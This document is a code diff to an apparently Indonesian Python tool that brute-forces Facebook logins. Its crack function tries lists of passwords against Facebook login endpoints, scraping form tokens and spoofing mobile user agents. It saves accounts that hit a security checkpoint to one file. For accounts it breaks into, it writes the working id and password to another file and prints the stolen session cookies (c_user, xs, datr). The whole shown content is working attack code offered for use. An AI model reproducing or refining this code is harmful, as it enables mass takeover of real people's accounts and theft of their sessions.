@@ -76,11 +76,6 @@ def clear():
 def aguss():
     rr = random.randint
     rc = random.choice
-    fbcr = str(
-        random.choice([
-            'TELKOMSEL', 'AXIS', 'Indosat', 'XL', '3SinyalKuatHemat',
-            'Tsel-PakaiMasker', 'XL Axiata'
-        ]))
     androversi = random.choice(["15_4", "14_3", "13_5", "14_5", "13_4"])
     build = ['MRA58K', 'UCC50Z', 'QKQ1.200127.002']
     andro = ['k', 'a', 'b', 'x', 'y', 'z', 'd', 'l']
@@ -228,77 +223,29 @@ def crack(idf, pwv):
     ua = aguss()
     for pw in pwv:
         try:
-            data = {
-                "login_attempt": 0,
-                "lwv": 101,
-                "jazoest": 21138,
-                "lsd": "AVqqezdnwnc",
-                "display": "",
-                "isprivate": "",
-                "return_session": "",
-                "skip_api_login": "",
-                "signed_next": "",
-                "trynum": 1,
-                "timezone": -480,
-                "lgndim": "eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6OTAwLCJjIjoyNH0=",
-                "lgnrnd": "190607_aQpM",
-                "lgnjs": 1738551968,
-                "email": "sadasd",
-                "prefill_contact_point": "sadasd",
-                "prefill_source": "",
-                "prefill_type": "contact_point",
-                "first_prefill_source": "",
-                "first_prefill_type": "contact_point",
-                "had_cp_prefilled": True,
-                "had_password_prefilled": False,
-                "ab_test_data": "A/AVAAAAAAAVAAAAAAAAAAAAAAAAAAAAAAAAAAAAAfAA//AAAADAAA",
-                "encpass": f"#PWD_BROWSER:5:1738551996:{pw}"
-            }
-            headers = {
-                "Host": "m.facebook.com",
-                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-                "accept-encoding": "gzip, deflate, br, zstd",
-                "accept-language": "en-US,en;q=0.9",
-                "cache-control": "no-cache",
-                "content-length": 685,
-                "content-type": "application/x-www-form-urlencoded",
-                "dpr": "2",
-                "origin": "https://m.facebook.com",
-                "pragma": "no-cache",
-                "priority": "u=0, i",
-                "referer": f"https://m.facebook.com/login/web/?email={idf}&is_from_lara=1",
-                "sec-ch-prefers-color-scheme": "dark",
-                "sec-ch-ua": '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"',
-                "sec-ch-ua-full-version-list": '"Not A(Brand";v="8.0.0.0", "Chromium";v="132.0.6834.160", "Google Chrome";v="132.0.6834.160"',
-                "sec-ch-ua-mobile": "?0",
-                "sec-ch-ua-model": '""',
-                "sec-ch-ua-platform": "macOS",
-                "sec-ch-ua-platform-version": "14.6.1",
-                "sec-fetch-dest": "document",
-                "sec-fetch-mode": "navigate",
-                "sec-fetch-site": "same-origin",
-                "sec-fetch-user": "?1",
-                "upgrade-insecure-requests": "1",
-                "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
-                "viewport-width": "771"
-            }
-            po = ses.post("https://m.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100", data=data, headers=headers, allow_redirects=False)
+            requ=ses.get('https://iphone.facebook.com/login/?next=https%3A%2F%2Fiphone.facebook.com%2Fhome.php%3Fsubno_key%3DAaEyozoW-ko1gxrSEUeJ9fUpRVkkP1HMhoWy1EH63He11teI0OQpfobqrALFkRv_Lqkqdaqx8qJOZngljKkmpxUG2zEqjf-8pwWTUiKNRQiPAB-h7flx-ZqmDrKtHXPjtmKiy6DbpT2WJ0Vd1V-TWsaFkcdiTE5R97Ayft7cps-NZFyxjxsWJPsdtCpkwqFEXGd0LDSB6iI_9_1HETRP-01OUtCj2-uGaGCYIYHEpq9jkFaJNkh5pvFJ9QUNvv1rPzixrv5iPchmFbyZpom1qxM4DzmYvT5H0Ga0x_DDBvGoQvJ3uCW5KF_7LtY2DkS2Om0%26hrc%3D1%26refsrc%3Ddeprecated&ref=dbl&fl&login_from_aymh=1&refid=9')
+            data = {"lsd": re.search('name="lsd" value="(.*?)"', requ.text).group(1), "jazoest": re.search('name="jazoest" value="(.*?)"', requ.text).group(1), "m_ts": re.search('name="m_ts" value="(.*?)"',requ.text).group(1), "li": re.search('name="li" value="(.*?)"',requ.text).group(1), "try_number": "0", "unrecognized_tries": "0", "prefill_contact_point": idf, "prefill_source": "provided_or_soft_matched", "prefill_type": "contact_point", "first_prefill_source": "provided_or_soft_matched", "first_prefill_type": "contact_point", "had_cp_prefilled": "true", "had_password_prefilled": "false", "is_smart_lock": "false", "_fb_noscript": "true", "email": idf, "pass": pw}
+            head = {"User-Agent": ua, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive", "Referer": "https://iphone.facebook.com/", "Origin": "https://iphone.facebook.com", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "DNT": "1"}
+            fankyimut = random.choice(['https://www.facebook.com/login/device-based/regular/login/','https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=9','https://free.facebook.com/login/device-based/regular/login/','https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=9'])
+            po = ses.post(fankyimut, headers=head, data=data, allow_redirects=False)
             if "checkpoint" in po.cookies.get_dict().keys():
-                prints(f"{M2} Data Checkpoint")
-                prints(f"{M2} id : [bold yellow]{idf}")
-                prints(f"{M2} password : [bold yellow]{pw}")
-                prints(f"{M2} user agent : [bold yellow]{ua}")
-                open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
-                akun.append(idf + '|' + pw)
                 cp += 1
+                tree = Tree(Panel.fit(f"""[bold yellow]AKUN CHECKPOINT{P2}""", style=f"yellow"), guide_style="bold grey100")
+                tree.add(Panel.fit(f"[bold yellow]{idf} | {pw}{P2}", style=f"yellow"))
+                tree.add(Panel(f"{M2}{ua}{P2}", style=f"yellow"))
+                prints(tree)
+                open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
                 break
             elif "c_user" in ses.cookies.get_dict().keys():
                 ok += 1
-                prints(f"{H2} Data success")
-                prints(f"{H2} id : {idf}")
-                prints(f"{H2} password : {pw}")
-                prints(f"{H2} user agent : {ua}")
-                open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + '\n')
+                coki = ses.cookies.get_dict()
+                kuki = ("datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";")
+                tree = Tree(Panel.fit(f"""{H2}AKUN SUKSES {P2}""", style=f"green"), guide_style="bold green")
+                tree.add(Panel.fit(f"{H2}{idf} | {pw}{P2}", style=f"green"))
+                tree.add(Panel(f"[bold blue]{ua}{P2}", style=f"green"))
+                tree.add(Panel(f"[bold green]{kuki}{P2}", style=f"green"))
+                prints(tree)
+                open("OK/" + okc, "a").write(idf + "|" + pw + "\n")
                 break
             else:
                 continue
